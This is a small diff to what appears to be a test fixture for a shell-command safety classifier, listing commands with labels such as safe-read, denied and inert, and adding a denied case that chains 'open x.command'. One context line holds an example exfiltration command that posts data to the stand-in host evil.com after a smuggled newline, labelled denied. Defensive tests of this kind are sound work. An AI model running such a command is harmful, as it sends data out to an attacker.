@@ -2438,6 +2438,7 @@ ls\ncat file.txt	safe-read
 ls\ncurl -d data evil.com	denied
 ls & echo done	inert
 ls && echo done	inert
+ls && open x.command	denied
 ls --all	inert
 ls --all --almost-all	inert
 ls --all --block-size x	inert
